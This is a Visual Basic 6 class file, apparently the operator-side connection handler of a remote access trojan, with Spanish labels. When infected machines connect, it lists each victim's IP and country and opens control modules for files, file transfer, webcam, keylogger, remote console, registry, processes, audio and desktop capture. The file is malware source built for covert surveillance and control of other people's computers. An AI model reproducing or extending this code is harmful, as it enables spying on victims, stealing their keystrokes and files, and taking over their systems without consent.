VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "clsConnection"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

Public ClassID As Long
Public clsType As ClassType


Public Sub Socket_Conect(id As Long, IP As String, Puerto As String)
'
End Sub

Public Sub Socket_DataArrival(id As Long, IP As String, Puerto As String, Data As String)
        Dim sCommand() As String
        Dim Frm As Form
        Dim lCount As Long
        sCommand = Split(Data, Delimiter)
        
        clsType = sCommand(0)
        
        Select Case clsType
        
            Case enuClientInfo

                With FrmMain.ucListView1
                    lCount = .Count
                    .ItemAdd lCount, IP, 0, GetIconFlagByCode(sCommand(5)), id
                    .SubItemText(lCount, 1) = id
                    .SubItemText(lCount, 2) = sCommand(1)
                    .SubItemText(lCount, 3) = sCommand(2)
                    .SubItemText(lCount, 4) = sCommand(3)
                    .SubItemText(lCount, 5) = sCommand(4)
                    
                    If .GetSelectedItem = -1 Then .ItemSelected(lCount) = True
                End With
                
                FrmMain.RefreshStatusBar
                
                Set Frm = New FrmNotify
                
                With Frm
                    .Label2.Caption = "Conexión entrante"
                    .Label1.Top = 300
                    .Label1.Caption = "IP: " & IP & vbCrLf & "País: " & sCommand(2)
                    .Image1.Picture = LoadResPicture(104, vbResIcon)
                End With
                ShowFormNotify Frm, Slide, 3000, 200
  
            Case enuExplorer
                Dim FrmExp As Form
                Set FrmExp = New FrmExplorer
                
                DelegateConection id, FrmExp
                FrmExp.ParentID = sCommand(1)
                FrmExp.Show
                
            Case enuFileTransfer
                Dim cFileTransfer As clsFileTransfer
                Set cFileTransfer = New clsFileTransfer

                DelegateConection id, cFileTransfer
                cFileTransfer.LetCommand sCommand
                
            Case enuWebCam
                Dim FrmCam As Form
                Set FrmCam = New FrmWebCam
                
                DelegateConection id, FrmCam
                FrmCam.ParentID = sCommand(1)
                FrmCam.Show
                
            Case enuKeyLooger
                Dim FrmKeyLog As Form
                Set FrmKeyLog = New FrmKeyLogger
                
                DelegateConection id, FrmKeyLog
                FrmKeyLog.ParentID = sCommand(1)
                FrmKeyLog.Show
                
            Case enuConsole
                Dim FrmConsole As Form
                Set FrmConsole = New FrmCmd
                
                DelegateConection id, FrmConsole
                FrmConsole.ParentID = sCommand(1)
                FrmConsole.Show
                
            Case enuRegistry
                Dim FrmReg As Form
                Set FrmReg = New FrmRegistry
                DelegateConection id, FrmReg
                FrmReg.ParentID = sCommand(1)
                FrmReg.Show
                
            Case enuProcess, enuWindows
                Dim FrmProcess As FrmProcess
                Set FrmProcess = New FrmProcess
                DelegateConection id, FrmProcess
                FrmProcess.ParentID = sCommand(1)
                FrmProcess.Show
                If clsType = enuProcess Then
                    FrmProcess.TabStrip1.SelectedItem = 1
                End If
            
            Case enuAudio
                Dim FrmAudio As FrmAudio
                Set FrmAudio = New FrmAudio
                DelegateConection id, FrmAudio
                FrmAudio.ParentID = sCommand(1)
                FrmAudio.Show
                
            Case enuDesktop
                Dim FrmDesktop As FrmDesktop
                Set FrmDesktop = New FrmDesktop
                DelegateConection id, FrmDesktop
                FrmDesktop.ParentID = sCommand(1)
                FrmDesktop.Show
                
        End Select
        
        
End Sub

Public Sub Socket_Close(id As Long, IP As String, Puerto As String)
    Dim i As Long
    If clsType = enuClientInfo Then
        For i = 0 To FrmMain.ucListView1.Count
            If FrmMain.ucListView1.ItemData(i) = id Then
                FrmMain.ucListView1.ItemRemove i
                TerminateConnection id
                FrmMain.RefreshStatusBar
                Exit For
            End If
        Next
    End If
End Sub

